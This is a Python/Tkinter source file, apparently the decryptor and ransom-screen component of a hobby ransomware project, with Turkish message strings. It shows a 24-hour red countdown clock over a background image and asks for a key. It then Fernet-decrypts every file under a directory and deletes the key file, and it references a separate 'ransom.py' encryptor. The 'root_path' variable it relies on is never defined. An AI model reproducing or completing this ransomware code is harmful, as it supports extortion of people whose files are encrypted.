import os
from tkinter import *
from tkinter import messagebox
from PIL import Image, ImageTk
from cryptography.fernet import Fernet

def decrypt_files():
    user_key = entry_key.get()
    if not user_key:
        messagebox.showerror("Hata", "Lütfen bir anahtar girin.")
        return

    try:
        secret_key = bytes(user_key, 'utf-8')
        Fernet(secret_key)
    except ValueError:
        messagebox.showerror("Hata", "Geçersiz anahtar. Lütfen tekrar deneyin.")
        return

    files = []
    for foldername, subfolders, filenames in os.walk(root_path):
        for filename in filenames:
            if filename not in ("desktop.ini", "ransom.py", "generatedkey.key", "Decrypt0r.py"):
                file_path = os.path.join(foldername, filename)
                files.append(file_path)

    for file in files:
        with open(file, "rb") as f:
            contents = f.read()
        contents_decrypted = Fernet(secret_key).decrypt(contents)
        with open(file, "wb") as f:
            f.write(contents_decrypted)

    os.remove("generatedkey.key")
    messagebox.showinfo("Bilgi", "Dosyalar başarıyla şifresi çözüldü.")

def update_clock(seconds):
    hours = seconds // 3600
    minutes = (seconds % 3600) // 60
    remaining_seconds = seconds % 60

    clock_text = "{:02d}:{:02d}:{:02d}".format(hours, minutes, remaining_seconds)
    clock_label.config(text=clock_text, fg="red")
    clock_label.config(font=("Arial", 36))

    if seconds > 0:
        root.after(1000, update_clock, seconds - 1)

ikon_yolu = os.path.join("icon", "key.ico")
root = Tk()
root.title("Decrypt0r")
root.geometry("490x500")
root.resizable(False, False)
root.iconbitmap(ikon_yolu)

class EntryWithPlaceholder(Entry):
    def __init__(self, master=None, placeholder="", color='grey', *args, **kwargs):
        super().__init__(master, *args, **kwargs)

        self.placeholder = placeholder
        self.placeholder_color = color
        self.default_fg_color = self["foreground"]

        self.bind("<FocusIn>", self.focus_in_event)
        self.bind("<FocusOut>", self.focus_out_event)

        self.put_placeholder()

    def put_placeholder(self):
        self.insert(0, self.placeholder)
        self.config(foreground=self.placeholder_color)

    def focus_in_event(self, event):
        if self.get() == self.placeholder:
            self.delete('0', 'end')
            self.config(foreground=self.default_fg_color)

    def focus_out_event(self, event):
        if not self.get():
            self.put_placeholder()

resim_yolu = os.path.join("icon", "rans12.jpg")
background_image = Image.open(resim_yolu)
background_photo = ImageTk.PhotoImage(background_image)
background_label = Label(root, image=background_photo)
background_label.place(relwidth=1, relheight=1)

clock_label = Label(root, font=("Arial", 36), bg="black")
clock_label.place(relx=0.53, rely=0.35, anchor=CENTER)
duration_seconds = 24 * 3600
update_clock(duration_seconds)

label_key = Label(root, text="Key:", fg="#000000", font=("Helvetica", 10, "bold"))
label_key.config(bg="#0ab9d8", padx=5, pady=3, borderwidth=1, relief="solid")
label_key.pack(pady=(320, 0), padx=(10, 5), side="left", anchor="w")

entry_key = EntryWithPlaceholder(root, placeholder="Enter your key", width=30)
entry_key.config(bg="#0ab9d8")
entry_key.pack(pady=(400, 20), padx=10, fill="x")

button_encrypt = Button(root, text="Decyrpt!!", command=decrypt_files,background="#0ab9d8",font=("Arial", 10, "bold"))
button_encrypt.pack(pady=(0,30), padx=(50, 85), anchor="s", expand=True)

root.mainloop()